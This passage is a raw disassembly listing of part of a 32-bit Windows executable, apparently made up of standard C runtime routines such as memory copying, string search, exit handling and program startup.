  403577:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403579:	fc                   	cld
  40357a:	ff 24 95 4c 36 40 00 	jmp    *0x40364c(,%edx,4)
  403581:	8d 49 00             	lea    0x0(%ecx),%ecx
  403584:	8a 46 03             	mov    0x3(%esi),%al
  403587:	23 d1                	and    %ecx,%edx
  403589:	88 47 03             	mov    %al,0x3(%edi)
  40358c:	8a 46 02             	mov    0x2(%esi),%al
  40358f:	c1 e9 02             	shr    $0x2,%ecx
  403592:	88 47 02             	mov    %al,0x2(%edi)
  403595:	83 ee 02             	sub    $0x2,%esi
  403598:	83 ef 02             	sub    $0x2,%edi
  40359b:	83 f9 08             	cmp    $0x8,%ecx
  40359e:	72 88                	jb     0x403528
  4035a0:	fd                   	std
  4035a1:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4035a3:	fc                   	cld
  4035a4:	ff 24 95 4c 36 40 00 	jmp    *0x40364c(,%edx,4)
  4035ab:	90                   	nop
  4035ac:	8a 46 03             	mov    0x3(%esi),%al
  4035af:	23 d1                	and    %ecx,%edx
  4035b1:	88 47 03             	mov    %al,0x3(%edi)
  4035b4:	8a 46 02             	mov    0x2(%esi),%al
  4035b7:	88 47 02             	mov    %al,0x2(%edi)
  4035ba:	8a 46 01             	mov    0x1(%esi),%al
  4035bd:	c1 e9 02             	shr    $0x2,%ecx
  4035c0:	88 47 01             	mov    %al,0x1(%edi)
  4035c3:	83 ee 03             	sub    $0x3,%esi
  4035c6:	83 ef 03             	sub    $0x3,%edi
  4035c9:	83 f9 08             	cmp    $0x8,%ecx
  4035cc:	0f 82 56 ff ff ff    	jb     0x403528
  4035d2:	fd                   	std
  4035d3:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4035d5:	fc                   	cld
  4035d6:	ff 24 95 4c 36 40 00 	jmp    *0x40364c(,%edx,4)
  4035dd:	8d 49 00             	lea    0x0(%ecx),%ecx
  4035e0:	00 36                	add    %dh,(%esi)
  4035e2:	40                   	inc    %eax
  4035e3:	00 08                	add    %cl,(%eax)
  4035e5:	36 40                	ss inc %eax
  4035e7:	00 10                	add    %dl,(%eax)
  4035e9:	36 40                	ss inc %eax
  4035eb:	00 18                	add    %bl,(%eax)
  4035ed:	36 40                	ss inc %eax
  4035ef:	00 20                	add    %ah,(%eax)
  4035f1:	36 40                	ss inc %eax
  4035f3:	00 28                	add    %ch,(%eax)
  4035f5:	36 40                	ss inc %eax
  4035f7:	00 30                	add    %dh,(%eax)
  4035f9:	36 40                	ss inc %eax
  4035fb:	00 43 36             	add    %al,0x36(%ebx)
  4035fe:	40                   	inc    %eax
  4035ff:	00 8b 44 8e 1c 89    	add    %cl,-0x76e371bc(%ebx)
  403605:	44                   	inc    %esp
  403606:	8f                   	(bad)
  403607:	1c 8b                	sbb    $0x8b,%al
  403609:	44                   	inc    %esp
  40360a:	8e 18                	mov    (%eax),%ds
  40360c:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
  403610:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  403614:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  403618:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  40361c:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  403620:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  403624:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  403628:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  40362c:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  403630:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  403634:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  403638:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  40363f:	03 f0                	add    %eax,%esi
  403641:	03 f8                	add    %eax,%edi
  403643:	ff 24 95 4c 36 40 00 	jmp    *0x40364c(,%edx,4)
  40364a:	8b ff                	mov    %edi,%edi
  40364c:	5c                   	pop    %esp
  40364d:	36 40                	ss inc %eax
  40364f:	00 64 36 40          	add    %ah,0x40(%esi,%esi,1)
  403653:	00 74 36 40          	add    %dh,0x40(%esi,%esi,1)
  403657:	00 88 36 40 00 8b    	add    %cl,-0x74ffbfca(%eax)
  40365d:	45                   	inc    %ebp
  40365e:	08 5e 5f             	or     %bl,0x5f(%esi)
  403661:	c9                   	leave
  403662:	c3                   	ret
  403663:	90                   	nop
  403664:	8a 46 03             	mov    0x3(%esi),%al
  403667:	88 47 03             	mov    %al,0x3(%edi)
  40366a:	8b 45 08             	mov    0x8(%ebp),%eax
  40366d:	5e                   	pop    %esi
  40366e:	5f                   	pop    %edi
  40366f:	c9                   	leave
  403670:	c3                   	ret
  403671:	8d 49 00             	lea    0x0(%ecx),%ecx
  403674:	8a 46 03             	mov    0x3(%esi),%al
  403677:	88 47 03             	mov    %al,0x3(%edi)
  40367a:	8a 46 02             	mov    0x2(%esi),%al
  40367d:	88 47 02             	mov    %al,0x2(%edi)
  403680:	8b 45 08             	mov    0x8(%ebp),%eax
  403683:	5e                   	pop    %esi
  403684:	5f                   	pop    %edi
  403685:	c9                   	leave
  403686:	c3                   	ret
  403687:	90                   	nop
  403688:	8a 46 03             	mov    0x3(%esi),%al
  40368b:	88 47 03             	mov    %al,0x3(%edi)
  40368e:	8a 46 02             	mov    0x2(%esi),%al
  403691:	88 47 02             	mov    %al,0x2(%edi)
  403694:	8a 46 01             	mov    0x1(%esi),%al
  403697:	88 47 01             	mov    %al,0x1(%edi)
  40369a:	8b 45 08             	mov    0x8(%ebp),%eax
  40369d:	5e                   	pop    %esi
  40369e:	5f                   	pop    %edi
  40369f:	c9                   	leave
  4036a0:	c3                   	ret
  4036a1:	8b ff                	mov    %edi,%edi
  4036a3:	55                   	push   %ebp
  4036a4:	8b ec                	mov    %esp,%ebp
  4036a6:	83 ec 10             	sub    $0x10,%esp
  4036a9:	eb 0d                	jmp    0x4036b8
  4036ab:	ff 75 08             	push   0x8(%ebp)
  4036ae:	e8 ea 0f 00 00       	call   0x40469d
  4036b3:	59                   	pop    %ecx
  4036b4:	85 c0                	test   %eax,%eax
  4036b6:	74 0f                	je     0x4036c7
  4036b8:	ff 75 08             	push   0x8(%ebp)
  4036bb:	e8 97 0d 00 00       	call   0x404457
  4036c0:	59                   	pop    %ecx
  4036c1:	85 c0                	test   %eax,%eax
  4036c3:	74 e6                	je     0x4036ab
  4036c5:	c9                   	leave
  4036c6:	c3                   	ret
  4036c7:	f6 05 30 08 41 00 01 	testb  $0x1,0x410830
  4036ce:	bf 24 08 41 00       	mov    $0x410824,%edi
  4036d3:	be a8 b2 40 00       	mov    $0x40b2a8,%esi
  4036d8:	75 2c                	jne    0x403706
  4036da:	83 0d 30 08 41 00 01 	orl    $0x1,0x410830
  4036e1:	6a 01                	push   $0x1
  4036e3:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4036e6:	50                   	push   %eax
  4036e7:	8b cf                	mov    %edi,%ecx
  4036e9:	c7 45 fc b0 b2 40 00 	movl   $0x40b2b0,-0x4(%ebp)
  4036f0:	e8 5e fa ff ff       	call   0x403153
  4036f5:	68 8d a5 40 00       	push   $0x40a58d
  4036fa:	89 35 24 08 41 00    	mov    %esi,0x410824
  403700:	e8 ce 01 00 00       	call   0x4038d3
  403705:	59                   	pop    %ecx
  403706:	57                   	push   %edi
  403707:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40370a:	e8 5a fb ff ff       	call   0x403269
  40370f:	68 f4 da 40 00       	push   $0x40daf4
  403714:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403717:	50                   	push   %eax
  403718:	89 75 f0             	mov    %esi,-0x10(%ebp)
  40371b:	e8 3f 04 00 00       	call   0x403b5f
  403720:	cc                   	int3
  403721:	cc                   	int3
  403722:	cc                   	int3
  403723:	cc                   	int3
  403724:	cc                   	int3
  403725:	cc                   	int3
  403726:	cc                   	int3
  403727:	cc                   	int3
  403728:	cc                   	int3
  403729:	cc                   	int3
  40372a:	cc                   	int3
  40372b:	cc                   	int3
  40372c:	cc                   	int3
  40372d:	cc                   	int3
  40372e:	cc                   	int3
  40372f:	cc                   	int3
  403730:	55                   	push   %ebp
  403731:	8b ec                	mov    %esp,%ebp
  403733:	57                   	push   %edi
  403734:	8b 7d 08             	mov    0x8(%ebp),%edi
  403737:	33 c0                	xor    %eax,%eax
  403739:	83 c9 ff             	or     $0xffffffff,%ecx
  40373c:	f2 ae                	repnz scas %es:(%edi),%al
  40373e:	83 c1 01             	add    $0x1,%ecx
  403741:	f7 d9                	neg    %ecx
  403743:	83 ef 01             	sub    $0x1,%edi
  403746:	8a 45 0c             	mov    0xc(%ebp),%al
  403749:	fd                   	std
  40374a:	f2 ae                	repnz scas %es:(%edi),%al
  40374c:	83 c7 01             	add    $0x1,%edi
  40374f:	38 07                	cmp    %al,(%edi)
  403751:	74 04                	je     0x403757
  403753:	33 c0                	xor    %eax,%eax
  403755:	eb 02                	jmp    0x403759
  403757:	8b c7                	mov    %edi,%eax
  403759:	fc                   	cld
  40375a:	5f                   	pop    %edi
  40375b:	c9                   	leave
  40375c:	c3                   	ret
  40375d:	8b ff                	mov    %edi,%edi
  40375f:	55                   	push   %ebp
  403760:	8b ec                	mov    %esp,%ebp
  403762:	8b 45 14             	mov    0x14(%ebp),%eax
  403765:	56                   	push   %esi
  403766:	85 c0                	test   %eax,%eax
  403768:	74 41                	je     0x4037ab
  40376a:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40376e:	75 13                	jne    0x403783
  403770:	e8 38 0b 00 00       	call   0x4042ad
  403775:	6a 16                	push   $0x16
  403777:	5e                   	pop    %esi
  403778:	89 30                	mov    %esi,(%eax)
  40377a:	e8 dc 0a 00 00       	call   0x40425b
  40377f:	8b c6                	mov    %esi,%eax
  403781:	eb 2a                	jmp    0x4037ad
  403783:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403787:	74 e7                	je     0x403770
  403789:	39 45 0c             	cmp    %eax,0xc(%ebp)
  40378c:	73 0e                	jae    0x40379c
  40378e:	e8 1a 0b 00 00       	call   0x4042ad
  403793:	6a 22                	push   $0x22
  403795:	59                   	pop    %ecx
  403796:	89 08                	mov    %ecx,(%eax)
  403798:	8b f1                	mov    %ecx,%esi
  40379a:	eb de                	jmp    0x40377a
  40379c:	50                   	push   %eax
  40379d:	ff 75 10             	push   0x10(%ebp)
  4037a0:	ff 75 08             	push   0x8(%ebp)
  4037a3:	e8 98 fb ff ff       	call   0x403340
  4037a8:	83 c4 0c             	add    $0xc,%esp
  4037ab:	33 c0                	xor    %eax,%eax
  4037ad:	5e                   	pop    %esi
  4037ae:	5d                   	pop    %ebp
  4037af:	c3                   	ret
  4037b0:	8b ff                	mov    %edi,%edi
  4037b2:	55                   	push   %ebp
  4037b3:	8b ec                	mov    %esp,%ebp
  4037b5:	51                   	push   %ecx
  4037b6:	53                   	push   %ebx
  4037b7:	56                   	push   %esi
  4037b8:	8b 35 e8 b0 40 00    	mov    0x40b0e8,%esi
  4037be:	57                   	push   %edi
  4037bf:	ff 35 4c 27 41 00    	push   0x41274c
  4037c5:	ff d6                	call   *%esi
  4037c7:	ff 35 48 27 41 00    	push   0x412748
  4037cd:	8b d8                	mov    %eax,%ebx
  4037cf:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4037d2:	ff d6                	call   *%esi
  4037d4:	8b f0                	mov    %eax,%esi
  4037d6:	3b f3                	cmp    %ebx,%esi
  4037d8:	0f 82 81 00 00 00    	jb     0x40385f
  4037de:	8b fe                	mov    %esi,%edi
  4037e0:	2b fb                	sub    %ebx,%edi
  4037e2:	8d 47 04             	lea    0x4(%edi),%eax
  4037e5:	83 f8 04             	cmp    $0x4,%eax
  4037e8:	72 75                	jb     0x40385f
  4037ea:	53                   	push   %ebx
  4037eb:	e8 b4 0f 00 00       	call   0x4047a4
  4037f0:	8b d8                	mov    %eax,%ebx
  4037f2:	8d 47 04             	lea    0x4(%edi),%eax
  4037f5:	59                   	pop    %ecx
  4037f6:	3b d8                	cmp    %eax,%ebx
  4037f8:	73 48                	jae    0x403842
  4037fa:	b8 00 08 00 00       	mov    $0x800,%eax
  4037ff:	3b d8                	cmp    %eax,%ebx
  403801:	73 02                	jae    0x403805
  403803:	8b c3                	mov    %ebx,%eax
  403805:	03 c3                	add    %ebx,%eax
  403807:	3b c3                	cmp    %ebx,%eax
  403809:	72 0f                	jb     0x40381a
  40380b:	50                   	push   %eax
  40380c:	ff 75 fc             	push   -0x4(%ebp)
  40380f:	e8 42 0f 00 00       	call   0x404756
  403814:	59                   	pop    %ecx
  403815:	59                   	pop    %ecx
  403816:	85 c0                	test   %eax,%eax
  403818:	75 16                	jne    0x403830
  40381a:	8d 43 10             	lea    0x10(%ebx),%eax
  40381d:	3b c3                	cmp    %ebx,%eax
  40381f:	72 3e                	jb     0x40385f
  403821:	50                   	push   %eax
  403822:	ff 75 fc             	push   -0x4(%ebp)
  403825:	e8 2c 0f 00 00       	call   0x404756
  40382a:	59                   	pop    %ecx
  40382b:	59                   	pop    %ecx
  40382c:	85 c0                	test   %eax,%eax
  40382e:	74 2f                	je     0x40385f
  403830:	c1 ff 02             	sar    $0x2,%edi
  403833:	50                   	push   %eax
  403834:	8d 34 b8             	lea    (%eax,%edi,4),%esi
  403837:	ff 15 e4 b0 40 00    	call   *0x40b0e4
  40383d:	a3 4c 27 41 00       	mov    %eax,0x41274c
  403842:	ff 75 08             	push   0x8(%ebp)
  403845:	8b 3d e4 b0 40 00    	mov    0x40b0e4,%edi
  40384b:	ff d7                	call   *%edi
  40384d:	89 06                	mov    %eax,(%esi)
  40384f:	83 c6 04             	add    $0x4,%esi
  403852:	56                   	push   %esi
  403853:	ff d7                	call   *%edi
  403855:	a3 48 27 41 00       	mov    %eax,0x412748
  40385a:	8b 45 08             	mov    0x8(%ebp),%eax
  40385d:	eb 02                	jmp    0x403861
  40385f:	33 c0                	xor    %eax,%eax
  403861:	5f                   	pop    %edi
  403862:	5e                   	pop    %esi
  403863:	5b                   	pop    %ebx
  403864:	c9                   	leave
  403865:	c3                   	ret
  403866:	8b ff                	mov    %edi,%edi
  403868:	56                   	push   %esi
  403869:	6a 04                	push   $0x4
  40386b:	6a 20                	push   $0x20
  40386d:	e8 98 0e 00 00       	call   0x40470a
  403872:	59                   	pop    %ecx
  403873:	59                   	pop    %ecx
  403874:	8b f0                	mov    %eax,%esi
  403876:	56                   	push   %esi
  403877:	ff 15 e4 b0 40 00    	call   *0x40b0e4
  40387d:	a3 4c 27 41 00       	mov    %eax,0x41274c
  403882:	a3 48 27 41 00       	mov    %eax,0x412748
  403887:	85 f6                	test   %esi,%esi
  403889:	75 05                	jne    0x403890
  40388b:	6a 18                	push   $0x18
  40388d:	58                   	pop    %eax
  40388e:	5e                   	pop    %esi
  40388f:	c3                   	ret
  403890:	83 26 00             	andl   $0x0,(%esi)
  403893:	33 c0                	xor    %eax,%eax
  403895:	5e                   	pop    %esi
  403896:	c3                   	ret
  403897:	6a 0c                	push   $0xc
  403899:	68 c8 d7 40 00       	push   $0x40d7c8
  40389e:	e8 2d 12 00 00       	call   0x404ad0
  4038a3:	e8 72 0f 00 00       	call   0x40481a
  4038a8:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4038ac:	ff 75 08             	push   0x8(%ebp)
  4038af:	e8 fc fe ff ff       	call   0x4037b0
  4038b4:	59                   	pop    %ecx
  4038b5:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4038b8:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4038bf:	e8 09 00 00 00       	call   0x4038cd
  4038c4:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4038c7:	e8 49 12 00 00       	call   0x404b15
  4038cc:	c3                   	ret
  4038cd:	e8 51 0f 00 00       	call   0x404823
  4038d2:	c3                   	ret
  4038d3:	8b ff                	mov    %edi,%edi
  4038d5:	55                   	push   %ebp
  4038d6:	8b ec                	mov    %esp,%ebp
  4038d8:	ff 75 08             	push   0x8(%ebp)
  4038db:	e8 b7 ff ff ff       	call   0x403897
  4038e0:	f7 d8                	neg    %eax
  4038e2:	1b c0                	sbb    %eax,%eax
  4038e4:	f7 d8                	neg    %eax
  4038e6:	59                   	pop    %ecx
  4038e7:	48                   	dec    %eax
  4038e8:	5d                   	pop    %ebp
  4038e9:	c3                   	ret
  4038ea:	8b ff                	mov    %edi,%edi
  4038ec:	55                   	push   %ebp
  4038ed:	8b ec                	mov    %esp,%ebp
  4038ef:	56                   	push   %esi
  4038f0:	8b 75 08             	mov    0x8(%ebp),%esi
  4038f3:	57                   	push   %edi
  4038f4:	83 cf ff             	or     $0xffffffff,%edi
  4038f7:	85 f6                	test   %esi,%esi
  4038f9:	75 14                	jne    0x40390f
  4038fb:	e8 ad 09 00 00       	call   0x4042ad
  403900:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  403906:	e8 50 09 00 00       	call   0x40425b
  40390b:	0b c7                	or     %edi,%eax
  40390d:	eb 44                	jmp    0x403953
  40390f:	f6 46 0c 83          	testb  $0x83,0xc(%esi)
  403913:	74 38                	je     0x40394d
  403915:	56                   	push   %esi
  403916:	e8 9e 1e 00 00       	call   0x4057b9
  40391b:	56                   	push   %esi
  40391c:	8b f8                	mov    %eax,%edi
  40391e:	e8 89 21 00 00       	call   0x405aac
  403923:	56                   	push   %esi
  403924:	e8 6a 1e 00 00       	call   0x405793
  403929:	50                   	push   %eax
  40392a:	e8 b9 20 00 00       	call   0x4059e8
  40392f:	83 c4 10             	add    $0x10,%esp
  403932:	85 c0                	test   %eax,%eax
  403934:	79 05                	jns    0x40393b
  403936:	83 cf ff             	or     $0xffffffff,%edi
  403939:	eb 12                	jmp    0x40394d
  40393b:	8b 46 1c             	mov    0x1c(%esi),%eax
  40393e:	85 c0                	test   %eax,%eax
  403940:	74 0b                	je     0x40394d
  403942:	50                   	push   %eax
  403943:	e8 63 02 00 00       	call   0x403bab
  403948:	83 66 1c 00          	andl   $0x0,0x1c(%esi)
  40394c:	59                   	pop    %ecx
  40394d:	83 66 0c 00          	andl   $0x0,0xc(%esi)
  403951:	8b c7                	mov    %edi,%eax
  403953:	5f                   	pop    %edi
  403954:	5e                   	pop    %esi
  403955:	5d                   	pop    %ebp
  403956:	c3                   	ret
  403957:	6a 0c                	push   $0xc
  403959:	68 e8 d7 40 00       	push   $0x40d7e8
  40395e:	e8 6d 11 00 00       	call   0x404ad0
  403963:	83 4d e4 ff          	orl    $0xffffffff,-0x1c(%ebp)
  403967:	33 c0                	xor    %eax,%eax
  403969:	8b 75 08             	mov    0x8(%ebp),%esi
  40396c:	85 f6                	test   %esi,%esi
  40396e:	0f 95 c0             	setne  %al
  403971:	85 c0                	test   %eax,%eax
  403973:	75 15                	jne    0x40398a
  403975:	e8 33 09 00 00       	call   0x4042ad
  40397a:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  403980:	e8 d6 08 00 00       	call   0x40425b
  403985:	83 c8 ff             	or     $0xffffffff,%eax
  403988:	eb 0d                	jmp    0x403997
  40398a:	f6 46 0c 40          	testb  $0x40,0xc(%esi)
  40398e:	74 0d                	je     0x40399d
  403990:	83 66 0c 00          	andl   $0x0,0xc(%esi)
  403994:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403997:	e8 79 11 00 00       	call   0x404b15
  40399c:	c3                   	ret
  40399d:	56                   	push   %esi
  40399e:	e8 ed 13 00 00       	call   0x404d90
  4039a3:	59                   	pop    %ecx
  4039a4:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4039a8:	56                   	push   %esi
  4039a9:	e8 3c ff ff ff       	call   0x4038ea
  4039ae:	59                   	pop    %ecx
  4039af:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4039b2:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4039b9:	e8 05 00 00 00       	call   0x4039c3
  4039be:	eb d4                	jmp    0x403994
  4039c0:	8b 75 08             	mov    0x8(%ebp),%esi
  4039c3:	56                   	push   %esi
  4039c4:	e8 3a 14 00 00       	call   0x404e03
  4039c9:	59                   	pop    %ecx
  4039ca:	c3                   	ret
  4039cb:	8b ff                	mov    %edi,%edi
  4039cd:	55                   	push   %ebp
  4039ce:	8b ec                	mov    %esp,%ebp
  4039d0:	83 3d 3c 08 41 00 02 	cmpl   $0x2,0x41083c
  4039d7:	74 05                	je     0x4039de
  4039d9:	e8 ab 23 00 00       	call   0x405d89
  4039de:	ff 75 08             	push   0x8(%ebp)
  4039e1:	e8 f4 21 00 00       	call   0x405bda
  4039e6:	68 ff 00 00 00       	push   $0xff
  4039eb:	e8 12 0e 00 00       	call   0x404802
  4039f0:	59                   	pop    %ecx
  4039f1:	59                   	pop    %ecx
  4039f2:	5d                   	pop    %ebp
  4039f3:	c3                   	ret
  4039f4:	6a 14                	push   $0x14
  4039f6:	68 08 d8 40 00       	push   $0x40d808
  4039fb:	e8 d0 10 00 00       	call   0x404ad0
  403a00:	33 f6                	xor    %esi,%esi
  403a02:	39 35 64 27 41 00    	cmp    %esi,0x412764
  403a08:	75 0b                	jne    0x403a15
  403a0a:	56                   	push   %esi
  403a0b:	56                   	push   %esi
  403a0c:	6a 01                	push   $0x1
  403a0e:	56                   	push   %esi
  403a0f:	ff 15 f0 b0 40 00    	call   *0x40b0f0
  403a15:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  403a1a:	66 39 05 00 00 40 00 	cmp    %ax,0x400000
  403a21:	74 05                	je     0x403a28
  403a23:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  403a26:	eb 36                	jmp    0x403a5e
  403a28:	a1 3c 00 40 00       	mov    0x40003c,%eax
  403a2d:	81 b8 00 00 40 00 50 	cmpl   $0x4550,0x400000(%eax)
  403a34:	45 00 00 
  403a37:	75 ea                	jne    0x403a23
  403a39:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  403a3e:	66 39 88 18 00 40 00 	cmp    %cx,0x400018(%eax)
  403a45:	75 dc                	jne    0x403a23
  403a47:	83 b8 74 00 40 00 0e 	cmpl   $0xe,0x400074(%eax)
  403a4e:	76 d3                	jbe    0x403a23
  403a50:	33 c9                	xor    %ecx,%ecx
  403a52:	39 b0 e8 00 40 00    	cmp    %esi,0x4000e8(%eax)
  403a58:	0f 95 c1             	setne  %cl
  403a5b:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  403a5e:	e8 e6 2e 00 00       	call   0x406949
  403a63:	85 c0                	test   %eax,%eax
  403a65:	75 08                	jne    0x403a6f
  403a67:	6a 1c                	push   $0x1c
  403a69:	e8 5d ff ff ff       	call   0x4039cb
  403a6e:	59                   	pop    %ecx
  403a6f:	e8 5a 2d 00 00       	call   0x4067ce
  403a74:	85 c0                	test   %eax,%eax
  403a76:	75 08                	jne    0x403a80
  403a78:	6a 10                	push   $0x10
  403a7a:	e8 4c ff ff ff       	call   0x4039cb
  403a7f:	59                   	pop    %ecx
  403a80:	e8 04 2a 00 00       	call   0x406489
  403a85:	89 75 fc             	mov    %esi,-0x4(%ebp)
  403a88:	e8 b7 27 00 00       	call   0x406244
  403a8d:	85 c0                	test   %eax,%eax
  403a8f:	79 08                	jns    0x403a99
  403a91:	6a 1b                	push   $0x1b
  403a93:	e8 0c 10 00 00       	call   0x404aa4
  403a98:	59                   	pop    %ecx
  403a99:	ff 15 ec b0 40 00    	call   *0x40b0ec
  403a9f:	a3 60 27 41 00       	mov    %eax,0x412760
  403aa4:	e8 43 27 00 00       	call   0x4061ec
  403aa9:	a3 38 08 41 00       	mov    %eax,0x410838
  403aae:	e8 8b 26 00 00       	call   0x40613e
  403ab3:	85 c0                	test   %eax,%eax
  403ab5:	79 08                	jns    0x403abf
  403ab7:	6a 08                	push   $0x8
  403ab9:	e8 e6 0f 00 00       	call   0x404aa4
  403abe:	59                   	pop    %ecx
  403abf:	e8 48 24 00 00       	call   0x405f0c
  403ac4:	85 c0                	test   %eax,%eax
  403ac6:	79 08                	jns    0x403ad0
  403ac8:	6a 09                	push   $0x9
  403aca:	e8 d5 0f 00 00       	call   0x404aa4
  403acf:	59                   	pop    %ecx
  403ad0:	6a 01                	push   $0x1
  403ad2:	e8 ac 0d 00 00       	call   0x404883
  403ad7:	59                   	pop    %ecx
  403ad8:	3b c6                	cmp    %esi,%eax
  403ada:	74 07                	je     0x403ae3
  403adc:	50                   	push   %eax
  403add:	e8 c2 0f 00 00       	call   0x404aa4
  403ae2:	59                   	pop    %ecx
  403ae3:	a1 90 0b 41 00       	mov    0x410b90,%eax
  403ae8:	a3 94 0b 41 00       	mov    %eax,0x410b94
  403aed:	50                   	push   %eax
  403aee:	ff 35 84 0b 41 00    	push   0x410b84
  403af4:	ff 35 7c 0b 41 00    	push   0x410b7c
  403afa:	e8 b1 e7 ff ff       	call   0x4022b0
  403aff:	83 c4 0c             	add    $0xc,%esp
  403b02:	89 45 e0             	mov    %eax,-0x20(%ebp)
  403b05:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
  403b08:	75 06                	jne    0x403b10
  403b0a:	50                   	push   %eax
  403b0b:	e8 4a 0f 00 00       	call   0x404a5a
  403b10:	e8 71 0f 00 00       	call   0x404a86
  403b15:	eb 2e                	jmp    0x403b45
  403b17:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403b1a:	8b 08                	mov    (%eax),%ecx
  403b1c:	8b 09                	mov    (%ecx),%ecx
  403b1e:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  403b21:	50                   	push   %eax
  403b22:	51                   	push   %ecx
  403b23:	e8 9a 22 00 00       	call   0x405dc2
  403b28:	59                   	pop    %ecx
  403b29:	59                   	pop    %ecx
  403b2a:	c3                   	ret
  403b2b:	8b 65 e8             	mov    -0x18(%ebp),%esp
  403b2e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403b31:	89 45 e0             	mov    %eax,-0x20(%ebp)
  403b34:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  403b38:	75 06                	jne    0x403b40
  403b3a:	50                   	push   %eax
  403b3b:	e8 30 0f 00 00       	call   0x404a70
  403b40:	e8 50 0f 00 00       	call   0x404a95
  403b45:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403b4c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403b4f:	e8 c1 0f 00 00       	call   0x404b15
  403b54:	c3                   	ret
  403b55:	e8 0d 2e 00 00       	call   0x406967
  403b5a:	e9 95 fe ff ff       	jmp    0x4039f4
  403b5f:	8b ff                	mov    %edi,%edi
  403b61:	55                   	push   %ebp
  403b62:	8b ec                	mov    %esp,%ebp
  403b64:	83 ec 20             	sub    $0x20,%esp
  403b67:	8b 45 08             	mov    0x8(%ebp),%eax
  403b6a:	56                   	push   %esi
  403b6b:	57                   	push   %edi
  403b6c:	6a 08                	push   $0x8
  403b6e:	59                   	pop    %ecx
  403b6f:	be c0 b2 40 00       	mov    $0x40b2c0,%esi
  403b74:	8d 7d e0             	lea    -0x20(%ebp),%edi
  403b77:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403b79:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403b7c:	8b 45 0c             	mov    0xc(%ebp),%eax
  403b7f:	5f                   	pop    %edi
  403b80:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403b83:	5e                   	pop    %esi
  403b84:	85 c0                	test   %eax,%eax
  403b86:	74 0c                	je     0x403b94
  403b88:	f6 00 08             	testb  $0x8,(%eax)
  403b8b:	74 07                	je     0x403b94
  403b8d:	c7 45 f4 00 40 99 01 	movl   $0x1994000,-0xc(%ebp)
  403b94:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403b97:	50                   	push   %eax
  403b98:	ff 75 f0             	push   -0x10(%ebp)
  403b9b:	ff 75 e4             	push   -0x1c(%ebp)
  403b9e:	ff 75 e0             	push   -0x20(%ebp)
  403ba1:	ff 15 80 b0 40 00    	call   *0x40b080
  403ba7:	c9                   	leave
  403ba8:	c2 08 00             	ret    $0x8
  403bab:	8b ff                	mov    %edi,%edi
  403bad:	55                   	push   %ebp
  403bae:	8b ec                	mov    %esp,%ebp
  403bb0:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  403bb4:	74 2d                	je     0x403be3
  403bb6:	ff 75 08             	push   0x8(%ebp)
  403bb9:	6a 00                	push   $0x0
  403bbb:	ff 35 f4 13 41 00    	push   0x4113f4
  403bc1:	ff 15 a0 b0 40 00    	call   *0x40b0a0
  403bc7:	85 c0                	test   %eax,%eax
  403bc9:	75 18                	jne    0x403be3
  403bcb:	56                   	push   %esi
  403bcc:	e8 dc 06 00 00       	call   0x4042ad
  403bd1:	8b f0                	mov    %eax,%esi
  403bd3:	ff 15 8c b0 40 00    	call   *0x40b08c
  403bd9:	50                   	push   %eax
  403bda:	e8 8c 06 00 00       	call   0x40426b
  403bdf:	59                   	pop    %ecx
  403be0:	89 06                	mov    %eax,(%esi)
  403be2:	5e                   	pop    %esi
  403be3:	5d                   	pop    %ebp
  403be4:	c3                   	ret
  403be5:	cc                   	int3
  403be6:	cc                   	int3
  403be7:	cc                   	int3
  403be8:	cc                   	int3
  403be9:	cc                   	int3
  403bea:	cc                   	int3
  403beb:	cc                   	int3
  403bec:	cc                   	int3
  403bed:	cc                   	int3
  403bee:	cc                   	int3
  403bef:	cc                   	int3
  403bf0:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403bf4:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403bf8:	85 d2                	test   %edx,%edx
  403bfa:	74 69                	je     0x403c65
